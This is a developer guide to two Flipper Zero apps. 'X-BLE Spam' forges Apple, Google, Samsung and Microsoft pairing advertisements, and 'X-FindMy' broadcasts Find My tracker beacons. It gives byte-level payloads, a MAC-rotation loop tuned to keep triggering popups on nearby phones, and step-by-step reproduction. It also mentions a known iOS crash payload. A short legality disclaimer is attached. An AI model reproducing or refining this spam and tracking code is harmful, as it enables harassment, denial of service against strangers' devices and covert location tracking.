# Flipper Zero BLE Implementation Guide — X-BLE Spam / X-FindMy

> Author: dwgx · Verified on Flipper Zero firmware 1.4.3 (OFW) · WB55 BLE stack
> Last updated: 2026-04-05
> Audience: Developers building BLE advertisement apps for Flipper Zero
> Goal: Document how Apple Continuity / Fast Pair / Swift Pair / Offline Finding were implemented using **only** the official `furi_hal_bt_extra_beacon_*` API, in a reproducible way.

---

## 1. Why this document exists

**Building a 3rd-party BLE app on Official Firmware is constrained.**

Flipper Zero's OFW exposes a tiny BLE surface to external apps for safety reasons. Custom firmware forks (Momentum, Xtreme, Unleashed) open up `ble_scan` and `ble_central`, but a `.fap` built against OFW only has:

| API | Purpose | External app (OFW)? |
|---|---|---|
| `furi_hal_bt_extra_beacon_*` | Inject non-connectable advertisements | ✅ public |
| `furi_hal_bt_start_advertising` | GATT peripheral | ✅ limited |
| `ble_scan_*` | Scan for advertisements | ❌ not on OFW |
| `ble_central_*` | Central connections | ❌ not on OFW |
| Raw HCI | ACI direct | ❌ crashes the stack |

This implementation uses **only `furi_hal_bt_extra_beacon_*`**. No ACI calls, no stack crashes, no reboot required.

---

## 2. What was delivered

### X-BLE Spam (`apps/toys/x_ble_spam/`)

A single-file Flipper app that uses non-connectable advertisements to reproduce proximity notifications from **39 device types**:

| Category | Examples | Continuity Type |
|---|---|---|
| Apple Proximity Pair | AirPods / AirPods Pro / AirPods Max / Beats / PowerBeats Pro | `0x07` |
| Apple Nearby Action | Apple TV Join / AppleTV Pair / Transfer Number | `0x0F` |
| Samsung EasySetup | Galaxy Buds / Watch | `0xFF 0x75 0x00` |
| Google Fast Pair | Android devices | service `0xFE2C` |
| Microsoft Swift Pair | Windows 10/11 pairing | `0xFF 0x06 0x00` |
| LoveSpouse | Toy control protocol | proprietary |
| `TypeRotate` | Cycles through all devices | N/A |

### X-FindMy (`apps/toys/x_findmy/`)

Apple Offline Finding beacon using SECP224R1 public key broadcast.

- Generates EC keypair on first launch, stored in Flipper LFS
- Embeds the public key's MSB fragment in the BLE MAC, rest goes into Manufacturer Data as OF frame (`0xFF 0x4C 0x00 0x12 0x19`)
- Imports/exports `.keys` files compatible with OpenHaystack / Macless-Haystack, enabling PC-side Find My network lookup

---

## 3. Architecture

```
┌─────────────────────────────────────────────┐
│           x_ble_spam (.fap, single-file)    │
├─────────────────────────────────────────────┤
│  UI Layer                                    │
│    ViewPort + canvas_draw_*                  │
│    InputEvent (Up/Down/Left/Right/OK/Back)   │
├─────────────────────────────────────────────┤
│  State Layer                                 │
│    devs[39]  — device definition table       │
│    current_idx, broadcasting, mac_rotate_ts  │
├─────────────────────────────────────────────┤
│  BLE Layer (public API only)                 │
│    furi_hal_bt_stop_advertising()            │
│    furi_hal_bt_extra_beacon_set_config()     │
│    furi_hal_bt_extra_beacon_set_data()       │
│    furi_hal_bt_extra_beacon_start()          │
│    furi_hal_bt_extra_beacon_stop()           │
├─────────────────────────────────────────────┤
│  HAL (read-only)                             │
│    furi_hal_random_fill_buf()                │
│    furi_hal_light_set() (LED feedback)       │
└─────────────────────────────────────────────┘
```

**Key design decisions:**

1. **Stop normal BT first.** Before `furi_hal_bt_extra_beacon_*`, call `furi_hal_bt_stop_advertising()`. Otherwise Flipper's own advert competes with yours and receivers miss it.
2. **Always restore on exit.** Stop the extra beacon and call `furi_hal_bt_start_advertising()` again — otherwise your device's BT stays dead.
3. **MAC rotation.** A fixed MAC gets cached by iOS so the popup fires once. Rotate every 3s via `stop → set_config(new_mac) → set_data → start`.
4. **`GapAddressTypeRandom` is mandatory.** Public addresses are **silently ignored** by iOS/macOS. On top of that, to satisfy Random Static rules (top 2 bits = `0b11`), OR `mac[5] |= 0xC0` at generation.

---

## 4. Packet format details

### 4.1 Apple Proximity Pair (AirPods family)

```c
uint8_t payload[27] = {
    0x1E,                       // total length
    0xFF,                       // AD type: Manufacturer Specific
    0x4C, 0x00,                 // Company ID: Apple (little-endian)
    0x07,                       // Continuity: Proximity Pair
    0x19,                       // subtype length
    model_hi, model_lo,         // e.g. 0x07,0x20 = AirPods Pro
    0x55,                       // status byte
    battery1,                   // rand() % 16  ← critical
    battery2,                   // rand() % 16
    lid_open_counter,           // rand() % 256
    dev_color,                  // 0x00 white etc.
    0x00,                       // padding
    /* 16 bytes of encrypted payload (all-zero works) */
    0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0
};
```

**Gotchas (observed empirically):**

- Using `rand() % 10` for battery bytes fails to trigger Beats Flex / Solo. **Must be `rand() % 16`** — Apple parses them as 4-bit fields.
- Changing status byte `0x55` alters per-device behavior. AirPods family requires exactly `0x55`.
- Randomizing `lid_open_counter` (vs. incrementing) makes iOS treat every advert as a new device, which matches our goal.

### 4.2 Apple Nearby Action

```c
uint8_t payload[14] = {
    0x0D, 0xFF, 0x4C, 0x00,
    0x0F,                       // Nearby Action
    0x05,                       // subtype length
    0xC0,                       // flags (typical)
    action_type,                // 0x13=Transfer Number, 0x09=AppleTV Pair
    rand_a, rand_b, rand_c,
    0x00, 0x00, 0x00
};
```

**Known limits:**
- `Setup New iPhone` (action `0x09`) patched in iOS 16.6+.
- `Join AppleTV` requires flags `0xBF` (not `0xC0`).
- iOS 17 Crash patched in 17.2.

### 4.3 Google Fast Pair

```c
uint8_t payload[14] = {
    0x03, 0x03, 0x2C, 0xFE,     // Complete Service UUIDs: 0xFE2C
    0x06, 0x16, 0x2C, 0xFE,     // Service Data UUID: 0xFE2C
    mid[0], mid[1], mid[2],     // Fast Pair Model ID
    0x00, 0x00, 0x00
};
```

Random model IDs still prompt (treated as unregistered device). Known model IDs (`0xD446B4` = Bose QC35) show branded UI.

### 4.4 Microsoft Swift Pair

```c
uint8_t payload[16] = {
    0x0F, 0xFF, 0x06, 0x00,     // Manufacturer: Microsoft
    0x03, 0x00, 0x80,           // Swift Pair header
    0x06,                       // device type: Mouse
    'F','l','i','p','p','e','r','Z'
};
```

Windows 11 auto-shows the "Add Device" toast. 23H2+ enforces 60s cooldown after 3 rapid prompts.

---

## 5. Core loop (pseudocode)

```c
static void broadcast_loop(BleSpamApp* app) {
    while(app->running) {
        if(app->broadcasting) {
            uint32_t now = furi_get_tick();
            if(now - app->mac_rotate_ts > 3000) {
                uint8_t mac[6];
                furi_hal_random_fill_buf(mac, 6);
                mac[5] |= 0xC0;  // Random Static Address marker

                GapExtraBeaconConfig cfg = {
                    .min_adv_interval_ms = 50,
                    .max_adv_interval_ms = 150,
                    .adv_channel_map = GapAdvChannelMapAll,
                    .adv_power_level = GapAdvPowerLevel_0dBm,
                    .address_type = GapAddressTypeRandom,
                };
                memcpy(cfg.address, mac, 6);

                furi_hal_bt_extra_beacon_stop();
                furi_hal_bt_extra_beacon_set_config(&cfg);
                furi_hal_bt_extra_beacon_set_data(
                    app->devs[app->current_idx].payload_builder(),
                    app->devs[app->current_idx].payload_len);
                furi_hal_bt_extra_beacon_start();
                app->mac_rotate_ts = now;
            }
        }
        furi_delay_ms(50);
    }
}
```

---

## 6. Reproduction steps

### 6.1 Prerequisites
- Flipper Zero hardware (OFW 0.103+ / 1.4+)
- iPhone iOS 16+ (for Apple Proximity Pair)
- Android device (for Google Fast Pair)
- Windows 11 PC (for Swift Pair)
- nRF Connect (iOS/Android) for raw advertisement inspection

### 6.2 Procedure
1. `cd $FLIPPER_PROJECT_ROOT/apps/toys/x_ble_spam && ufbt launch`
2. On Flipper, select `TypeApplePair`, press OK to start broadcasting (blue LED)
3. Place iPhone within 30cm → AirPods popup appears in 2–5 seconds
4. Use nRF Connect to confirm MAC rotation (new MAC every 3s)
5. Troubleshooting:
   - Blue LED never lights → `furi_hal_bt_extra_beacon_set_config` failed; re-check `address_type`
   - LED lights but iPhone shows nothing → verify `mac[5] |= 0xC0` and Continuity subtype byte
   - nRF Connect sees it but iOS doesn't → check Continuity type byte (`0x07`)

### 6.3 LED codes

| LED | Meaning |
|---|---|
| Blue | Extra beacon started successfully |
| Red | `set_config` or `start` failed |
| Off | Broadcasting stopped (press OK to resume) |

---

## 7. Known protocol-layer limits

These are **OS-side behaviors, not code bugs**:

| Symptom | Cause |
|---|---|
| Apple Watch popup says "Not Your Device" | Expected; signature mismatch |
| AirPods Max / Beats Studio pop once then stop | Device-side cooldown |
| `Setup New iPhone` silent | Patched in iOS 16.6+ |
| iOS 17.2+ immune to `iOS17 Crash` | Patched |
| Fast Pair weakened on Android 12+ | Google throttling |

---

## 8. OSS publication notes

### 8.1 Legality

This implementation is intended **strictly for**:
- Security testing of your own devices
- BLE protocol research / education
- BLE stack compatibility verification

**Prohibited:**
- Harassment of others
- Public-space spam
- Targeting specific individuals

Interfering with third-party electronic devices is illegal in most jurisdictions (FCC Part 15 USA, Radio Law §59 Japan, EU RED 2014/53/EU).

### 8.2 Suggested repo layout

```
x_ble_spam/
├── README.md
├── LICENSE                 ← GPL-3.0 (matches Flipper SDK)
├── application.fam
├── x_ble_spam.c
├── devices/
│   ├── apple_pair.c
│   ├── apple_action.c
│   ├── samsung.c
│   ├── google.c
│   └── microsoft.c
├── docs/
│   ├── ARCHITECTURE.md
│   ├── PACKET_FORMATS.md
│   └── FAQ.md
└── examples/
    └── add_new_device.md
```

### 8.3 Contribution guidelines (suggested)

- New device definitions require real-device verification
- PRs must list iOS / Android / Windows version tested
- Patched protocols are not accepted

---

## 9. Related resources

| Resource | URL | Purpose |
|---|---|---|
| furi_hal_bt API | `vendor_firmware/ofw_baseline/targets/f7/furi_hal/furi_hal_bt.h` | local reference |
| Apple Continuity | https://github.com/furiousMAC/continuity | reverse-engineering corpus |
| Google Fast Pair | https://developers.google.com/nearby/fast-pair/specifications | official spec |
| Microsoft Swift Pair | https://learn.microsoft.com/en-us/windows-hardware/design/component-guidelines/bluetooth-swift-pair | official spec |
| Macless-Haystack | https://github.com/dchristl/macless-haystack | FindMy companion |
| OpenHaystack | https://github.com/seemoo-lab/openhaystack | FindMy origin |

---

## 10. Future extensions

- [ ] Tile / SmartTag additions (same family as Offline Finding)
- [ ] Reverse-engineer Continuity v2 (iOS 17+ new framing)
- [ ] GATT peripheral "fake device" mode via `furi_hal_bt_start_advertising`
- [ ] qFlipper plugin for dynamic device-definition authoring
